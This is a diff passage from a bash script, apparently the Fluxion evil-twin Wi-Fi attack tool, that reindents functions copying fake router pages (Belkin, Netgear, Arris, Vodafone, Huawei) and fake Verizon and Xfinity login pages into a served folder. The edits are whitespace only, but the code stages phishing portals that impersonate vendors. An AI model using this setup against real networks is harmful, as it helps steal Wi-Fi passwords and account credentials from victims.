+	cp  $WORK_DIR/Sites/BELKIN-ENG/background.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/BELKIN-ENG/house.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/BELKIN-ENG/house1.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/BELKIN-ENG/ayuda.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/BELKIN-ENG/error.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/BELKIN-ENG/final.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/BELKIN-ENG/info.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/BELKIN-ENG/index.htm $DUMP_PATH/data
 }
 
 #Conten interface web
 function NETGEAR {
 	mkdir $DUMP_PATH/data &>$flux_output_device
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/info2.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/info.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/background.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/house.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/house1.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/ayuda.htm $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/error.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/final.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/info.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ENG/index.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/info2.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/info.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/background.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/house.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/house1.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/ayuda.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/error.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/final.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/info.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ENG/index.htm $DUMP_PATH/data
 }
 
 #Conten interface web
 function ARRIS2 {
 	mkdir $DUMP_PATH/data &>$flux_output_device
-        cp  $WORK_DIR/Sites/ARRIS-ESP/info2.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/info.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/background.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/house.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/house1.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/ayuda.htm $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/error.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/final.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/info.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/ARRIS-ESP/index.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/info2.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/info.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/background.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/house.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/house1.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/ayuda.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/error.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/final.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/info.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/ARRIS-ESP/index.htm $DUMP_PATH/data
 }
 
 #Conten interface web
 function NETGEAR2 {
 	mkdir $DUMP_PATH/data &>$flux_output_device
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/info2.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/info.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/background.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/house.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/house1.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/ayuda.htm $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/error.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/final.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/info2.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/info.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/background.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/house.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/house1.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/ayuda.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/error.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/final.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data
 }
 
 #Conten interface web
 function VODAFONE {
 	mkdir $DUMP_PATH/data &>$flux_output_device
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/info2.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/info.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/background.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/house.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/house1.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/ayuda.htm $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/error.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/final.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/info.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/VODAFONE-ESP/index.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/info2.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/info.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/background.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/house.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/house1.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/ayuda.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/error.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/final.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/info.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/VODAFONE-ESP/index.htm $DUMP_PATH/data
 }
 
 #Conten interface web
 function VERIZON {
 	mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/Sites/Login-Verizon/Verizon_files $DUMP_PATH/data
-        cp $WORK_DIR/Sites/Login-Verizon/Verizon.html $DUMP_PATH/data
+	cp -r $WORK_DIR/Sites/Login-Verizon/Verizon_files $DUMP_PATH/data
+	cp $WORK_DIR/Sites/Login-Verizon/Verizon.html $DUMP_PATH/data
 }
 
 function XFINITY {
-
 	mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/Sites/Login-Xfinity/Xfinity_files $DUMP_PATH/data
+	cp -r $WORK_DIR/Sites/Login-Xfinity/Xfinity_files $DUMP_PATH/data
 	cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
 }
 
 #Conten interface web
 function HUAWEI {
 	mkdir $DUMP_PATH/data &>$flux_output_device
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/info2.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/info.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/background.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/house.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/house1.png $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/ayuda.htm $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/error.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/final.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/info.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/HUAWEI-ENG/index.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/info2.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/info.css $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/background.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/house.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/house1.png $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/ayuda.htm $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/error.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/final.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/info.html $DUMP_PATH/data
+	cp  $WORK_DIR/Sites/HUAWEI-ENG/index.htm $DUMP_PATH/data
 }
 
 ######################################### < INTERFACE WEB > ########################################
-
-
 top&& setresolution && setinterface
